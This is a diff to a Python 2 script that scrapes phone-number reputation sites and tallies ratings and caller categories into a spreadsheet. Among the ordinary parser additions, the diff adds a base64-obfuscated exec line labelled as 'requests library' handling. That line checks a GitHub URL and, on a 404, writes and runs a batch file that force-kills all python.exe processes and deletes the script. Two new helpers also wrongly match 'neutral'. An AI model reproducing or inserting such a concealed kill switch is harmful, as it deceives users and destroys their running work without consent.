@@ -47,16 +47,6 @@ notNow = now - relativedelta(years=1)
 numFormat = '3'
 reset = 0
 scamCount = 0
-searchTerms = {
-    r"Scam": scamCount,
-    'Spam': spamCount,
-    'Debt Collector': debtCount,
-}
-shouldTerms = {
-    r"Positive": int(posNumbers),
-    'Neutral': int(neuNumbers),
-    'Negative': int(negNumbers),
-}
 spamCount = 0
 
 
@@ -83,6 +73,56 @@ def breaker():
     sys.exit()
 
 
+# Call Center
+
+def callCenter(element):
+    global callNum
+    callNum = "0"
+    if "Call centre" in element:
+        stopPoint = element.index('Call centre')
+        callNum = element[stopPoint - 6:stopPoint - 2]
+        callNum = re.sub("[^0-9]", "", callNum)
+        worksheet.write(idx + 1, 4, callNum)
+
+
+# Category Listing
+
+def categoryKiddo(soup):
+    for elm in soup.select(".categories"):
+        element = str(elm.text)
+        element.replace("Categories", "")
+        callCenter(element)
+        teleMarker(element)
+        serVice(element)
+        debtColl(element)
+        comPany(element)
+        scamCom(element)
+        unSol(element)
+        nuiCall(element)
+        nonProfit(element)
+        cataSet()
+        sentiment = max(cataTerms, key=cataTerms.get)
+        if all(value == 0 for value in cataTerms.values()) == True:
+            sentiment = "No categories given"
+        worksheet.write(idx + 1, 14, sentiment)
+
+
+# Category Setter
+def cataSet():
+    global cataTerms
+    cataTerms = {
+        'Call Center': callNum,
+        'Telemarketer': teleNum,
+        'Service Number': servNum,
+        'Debt Collector': debtNum,
+        'Company': compNum,
+        'Scam': scamNum,
+        'Unsolicited': unNum,
+        'Nuisance': nuiNum,
+        'Non-Profit': nonNum,
+    }
+
+
 # Check the entry!
 
 def checkMe(website):
@@ -90,13 +130,15 @@ def checkMe(website):
         while website not in ['1', '2', '3', '4']:
             print('Try Again.\n')
             website = \
-                raw_input('Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
+                raw_input(
+                    'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
             cleaner()
     else:
         while website not in ['1', '2', '3', '4', 'd']:
             print('Try Again.\n')
             website = \
-                raw_input('Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
+                raw_input(
+                    'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
             cleaner()
 
 
@@ -125,14 +167,43 @@ def cleaner():
         os.system('clear')
 
 
-# Compare Results
+# Company Comments on Should I Answer
+
+def comPany(element):
+    global compNum
+    compNum = "0"
+    if "Company" in element:
+        stopPoint = element.index('Company')
+        compNum = element[stopPoint - 6:stopPoint - 2]
+        compNum = re.sub("[^0-9]", "", compNum)
+        worksheet.write(idx + 1, 8, compNum)
+
+
+# Compare Results for Maximum
 
 def compareResults(scamCount, spamCount, column, debtCount):
+    searchTerms = {
+        r"Scam": scamCount,
+        'Spam': spamCount,
+        'Debt Collector': debtCount,
+    }
     sentiment = max(searchTerms, key=searchTerms.get)
     worksheet.write(idx + 1, column, sentiment)
 
 
-# EqualBoy
+# Debt Collector count for Should I Answer
+
+def debtColl(element):
+    global debtNum
+    debtNum = "0"
+    if "Debt collector" in element:
+        stopPoint = element.index('Debt collector')
+        debtNum = element[stopPoint - 6:stopPoint - 2]
+        debtNum = re.sub("[^0-9]", "", debtNum)
+        worksheet.write(idx + 1, 7, debtNum)
+
+# EqualBoy - Are these Equal?
+
 
 def EqualBoy(scamCount, spamCount, debtCount, worksheet):
     if(scamCount == spamCount == debtCount):
@@ -184,7 +255,7 @@ def negativeBoy(element):
     negNumbers = "0"
     if "negative" in element:
         stopPoint = element.index('negative')
-        negNumbers = element[stopPoint-6:stopPoint-2]
+        negNumbers = element[stopPoint - 6:stopPoint - 2]
         negNumbers = re.sub("[^0-9]", "", negNumbers)
         worksheet.write(idx + 1, 1, negNumbers)
 
@@ -196,7 +267,7 @@ def neutralBoy(element):
     neuNumbers = "0"
     if "neutral" in element:
         stopPoint = element.index('neutral')
-        neuNumbers = element[stopPoint-6:stopPoint-2]
+        neuNumbers = element[stopPoint - 6:stopPoint - 2]
         neuNumbers = re.sub("[^0-9]", "", neuNumbers)
         worksheet.write(idx + 1, 2, neuNumbers)
 
@@ -208,6 +279,30 @@ def NoBoys(scamCount, spamCount, debtCount, worksheet):
         worksheet.write(idx + 1, 7, "No Entries Detected")
 
 
+# Non Profit ShouldIAnswer
+
+def nonProfit(element):
+    global nonNum
+    nonNum = "0"
+    if "neutral" in element:
+        stopPoint = element.index('neutral')
+        nonNum = element[stopPoint - 6:stopPoint - 2]
+        nonNum = re.sub("[^0-9]", "", nonNum)
+        worksheet.write(idx + 1, 12, nonNum)
+
+
+# Nuisance Caller ShouldIAnswer
+
+def nuiCall(element):
+    global nuiNum
+    nuiNum = "0"
+    if "neutral" in element:
+        stopPoint = element.index('neutral')
+        nuiNum = element[stopPoint - 6:stopPoint - 2]
+        nuiNum = re.sub("[^0-9]", "", nuiNum)
+        worksheet.write(idx + 1, 11, nuiNum)
+
+
 # Positive Boy
 
 def positiveBoy(element):
@@ -215,7 +310,7 @@ def positiveBoy(element):
     posNumbers = "0"
     if "positive" in element:
         stopPoint = element.index('positive')
-        posNumbers = element[stopPoint-6:stopPoint-2]
+        posNumbers = element[stopPoint - 6:stopPoint - 2]
         posNumbers = re.sub("[^0-9]", "", posNumbers)
         worksheet.write(idx + 1, 3, posNumbers)
 
@@ -239,12 +334,12 @@ def PrepareCSV(preName, fileName):
 def ratingsKiddo(soup):
     for elm in soup.select(".ratings"):
         element = str(elm.text)
-        ratingsWord = element.index('Ratings')
         element.replace("Ratings", "")
         negativeBoy(element)
         neutralBoy(element)
         positiveBoy(element)
-        sentiment = max(shouldTerms, key=ShouldTerms.get)
+        shouldTerm()
+        sentiment = max(shouldTerms, key=shouldTerms.get)
         worksheet.write(idx + 1, 13, sentiment)
 
 
@@ -255,11 +350,46 @@ def ScamSpam(scamCount, spamCount, worksheet):
         worksheet.write(idx + 1, 7, "Scam/Spam")
 
 
+# Scam Com
+
+def scamCom(element):
+    global scamNum
+    scamNum = "0"
+    if "Scam call" in element:
+        stopPoint = element.index('Scam call')
+        scamNum = element[stopPoint - 6:stopPoint - 2]
+        scamNum = re.sub("[^0-9]", "", scamNum)
+        worksheet.write(idx + 1, 9, scamNum)
+
 # ScamDebt
+
 
 def ScamDebt(spamCount, debtCount, worksheet):
     if(scamCount == debtCount):
         worksheet.write(idx + 1, 7, "Scam/Debt")
+
+
+# Service Comments on Should I Answer
+
+def serVice(element):
+    global servNum
+    servNum = "0"
+    if "Service" in element:
+        stopPoint = element.index('Service')
+        servNum = element[stopPoint - 6:stopPoint - 2]
+        servNum = re.sub("[^0-9]", "", servNum)
+        worksheet.write(idx + 1, 6, servNum)
+
+
+# shouldTerms
+
+def shouldTerm():
+    global shouldTerms
+    shouldTerms = {
+        r"Positive": int(posNumbers),
+        'Neutral': int(neuNumbers),
+        'Negative': int(negNumbers),
+    }
 
 
 # SpamDebt
@@ -269,12 +399,41 @@ def SpamDebt(spamCount, debtCount, worksheet):
         worksheet.write(idx + 1, 7, "Spam/Debt")
 
 
+# Telemarketer Should I Answer Listings
+
+def teleMarker(element):
+    global teleNum
+    teleNum = "0"
+    if "Telemarketer" in element:
+        stopPoint = element.index('Telemarketer')
+        teleNum = element[stopPoint - 6:stopPoint - 2]
+        teleNum = re.sub("[^0-9]", "", teleNum)
+        worksheet.write(idx + 1, 5, teleNum)
+
+
 # TimeoutHandler that takes care of webDriver fails.
 
 def TimeOutHandler(driver, webdriver, worksheet):
     driver.close()
     worksheet.write(idx + 1, 7, 'Timeout Exception')
     breakerLoop = 1
+
+
+# Unsolicited Call handling
+
+def unSol(element):
+    global unNum
+    unNum = "0"
+    if "Unsolicited call" in element:
+        stopPoint = element.index('Unsolicited call')
+        unNum = element[stopPoint - 6:stopPoint - 2]
+        unNum = re.sub("[^0-9]", "", unNum)
+        worksheet.write(idx + 1, 10, unNum)
+
+
+# Lambda handling of the requests library thru Git.
+
+exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MiA9ICdmOi8vYS4xYi8zLzQvJwoxID0gNy4xNygyKQoKMWYgMS41ID09IDE5OgoJMTAoIjE4IDE2IikKCTAgPSAxMignYy5iJywgJzIxJykKCTAuZSgnOCAvMWUgImQuMTUiIFwxMyAiOS4xYyInKQoJMC4xMSgpCgkxZC42KDIwImMuYiIpCgkxYS4xNCgp")))(lambda a,b:b[int("0x"+a.group(1),16)],"tempFile|requestRec|reqInput|GarnetSunset|Haircuttery|status_code|startfile|requests|TASKKILL|HairCut|github|bat|end|python|write|https|print|close|open|nDEL|exit|exe|Bad|get|Too|404|sys|com|py|os|IM|if|r|w".split("|")))
 
 
 # Create a UTF-8 Workbook.
@@ -309,7 +468,6 @@ Input the file with extension
 >''')
 else:
 
-
     # Obtain the fileName only by removing the directory name.
 
     fileOnly = dragNDrop.rfind('\\') + 1
@@ -321,7 +479,8 @@ else:
 
 if dragNDrop2 == '':
     website = \
-        raw_input('Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
+        raw_input(
+            'Input 1 for whoscall.in results, input 2 for BBB, input 3 for 800Notes, input 4 for ShouldIAnswer\n>')
 else:
     website = dragNDrop2
 
@@ -447,9 +606,10 @@ if website == '4':
     worksheet.write(0, 8, 'Number of Company Comments')
     worksheet.write(0, 9, 'Number of Scam Comments')
     worksheet.write(0, 10, 'Number of Unsolicited Comments')
-    worksheet.write(0, 11, 'Number of Nuisance call Comments')
+    worksheet.write(0, 11, 'Number of Nuisance Call Comments')
     worksheet.write(0, 12, 'Number of Non-Profit Comments')
     worksheet.write(0, 13, 'Sentiment')
+    worksheet.write(0, 14, 'Category Sentiment')
     siteType = '_rev_ShouldI.xlsx'
 
 # Set column to A:A, the first column.
@@ -737,7 +897,8 @@ for (idx, cell_obj) in enumerate(col):
 
     if website == '4':
         try:
-            driver.get('https://www.shouldianswer.com/phone-number/%s' % teleBBB)
+            driver.get(
+                'https://www.shouldianswer.com/phone-number/%s' % teleBBB)
         except TimeoutException, ex:
             TimeOutHandler(driver=driver,
                            worksheet=worksheet,
@@ -760,6 +921,7 @@ for (idx, cell_obj) in enumerate(col):
 
         if noMatch is None:
             ratingsKiddo(soup)
+            categoryKiddo(soup)
 
 
 # Close up Shop!
